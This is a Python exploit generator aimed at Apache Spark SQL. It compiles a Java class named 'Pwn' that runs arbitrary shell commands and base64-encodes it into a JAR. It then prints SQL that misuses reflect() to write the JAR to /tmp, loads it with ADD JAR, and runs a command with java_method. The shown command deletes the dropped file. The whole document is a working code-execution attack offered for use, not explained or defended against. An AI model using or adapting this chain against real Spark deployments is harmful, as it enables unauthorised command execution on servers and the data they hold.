#!/usr/bin/env python
# Compatible with Python 2.7 and Python 3.x (3.1+)

from __future__ import print_function
import os
import sys
import io
import zipfile
import tempfile
import subprocess
import base64
import shutil

def main():
    # Java source as triple-quoted string, packaged under pwn
    java_src = """\
package pwn;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Pwn {

    public static void exec(String cmd) {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            Process process;
            if (os.contains("win")) {
                // Windows
                process = Runtime.getRuntime().exec(new String[] { "cmd.exe", "/c", cmd });
            } else {
                // Unix/Linux/Mac
                process = Runtime.getRuntime().exec(new String[] { "/bin/sh", "-c", cmd });
            }

            // Optional: print command output
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }

            reader = new BufferedReader(
                new InputStreamReader(process.getErrorStream()));
            while ((line = reader.readLine()) != null) {
                System.err.println(line);
            }

            process.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        System.out.println("[+] module loaded");
        if (args.length > 0) {
            exec(args[0]);
        }
    }
}
"""

    tmpdir = tempfile.mkdtemp(prefix="jbuild_")
    src_dir = os.path.join(tmpdir, "src")
    out_dir = os.path.join(tmpdir, "classes")
    pkg_dir = os.path.join(src_dir, "pwn")
    if not os.path.isdir(pkg_dir):
        os.makedirs(pkg_dir)
    if not os.path.isdir(out_dir):
        os.makedirs(out_dir)

    src_path = os.path.join(pkg_dir, "Pwn.java")
    class_relpath = os.path.join("pwn", "Pwn.class")
    class_abspath = os.path.join(out_dir, class_relpath)

    # Use a unique jar path to avoid reusing any previously corrupted file
    jar_name = "pwn_{0}.jar".format(os.getpid())
    spark_jar_path = "/tmp/{0}".format(jar_name)

    try:
        # Write Java source
        with open(src_path, "wb") as f:
            if isinstance(java_src, bytes):
                f.write(java_src)
            else:
                f.write(java_src.encode("utf-8"))

        # Compile into out_dir, producing pwn/HelloWorld.class
        try:
            proc = subprocess.Popen(
                ["javac", "-d", out_dir, src_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
        except OSError as e:
            sys.stderr.write("Error: failed to execute javac. Ensure JDK is installed and on PATH.\n")
            sys.stderr.write("Details: {0}\n".format(str(e)))
            sys.exit(1)

        out, err = proc.communicate()
        if proc.returncode != 0:
            if out:
                try:
                    sys.stderr.write(out.decode("utf-8", "ignore"))
                except Exception:
                    sys.stderr.write(str(out))
            if err:
                try:
                    sys.stderr.write(err.decode("utf-8", "ignore"))
                except Exception:
                    sys.stderr.write(str(err))
            sys.stderr.write("Error: javac failed with exit code {0}\n".format(proc.returncode))
            sys.exit(proc.returncode)

        if not os.path.exists(class_abspath):
            sys.stderr.write("Error: class not generated at {0}\n".format(class_abspath))
            sys.exit(1)

        # Build JAR in memory with the packaged class
        jar_buf = io.BytesIO()
        with zipfile.ZipFile(jar_buf, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
            manifest = "Manifest-Version: 1.0\r\nCreated-By: Python Zipfile\r\n\r\n"
            zf.writestr("META-INF/MANIFEST.MF", manifest)
            with open(class_abspath, "rb") as cf:
                zf.writestr(class_relpath, cf.read())

        jar_bytes = jar_buf.getvalue()

        # Also write the JAR locally (optional)
        try:
            with open(spark_jar_path, "wb") as f:
                f.write(jar_bytes)
        except Exception:
            pass

        # Base64 encode for Spark SQL reflect write
        b64 = base64.b64encode(jar_bytes)
        if not isinstance(b64, str):
            b64 = b64.decode("ascii")

        # Print Spark SQL statements:
        # 1) Write exact bytes: Files.write(Paths.get('/tmp/pwn_<pid>.jar'), unbase64(...))
        #    Use the single-argument Paths.get(String) overload (no array()).
        # 2) Add the jar
        # 3) Call the static method in the packaged class
        print(
            "SELECT reflect("
            "'java.nio.file.Files','write',"
            "reflect('java.nio.file.Paths','get','{0}'),"
            "unbase64('{1}'));".format(spark_jar_path, b64)
        )
        print("ADD JAR '{0}';".format(spark_jar_path))
        print("SELECT java_method('pwn.Pwn', 'exec', '/bin/rm {0}');".format(spark_jar_path))

    finally:
        try:
            shutil.rmtree(tmpdir)
        except Exception:
            pass

if __name__ == "__main__":
    main()

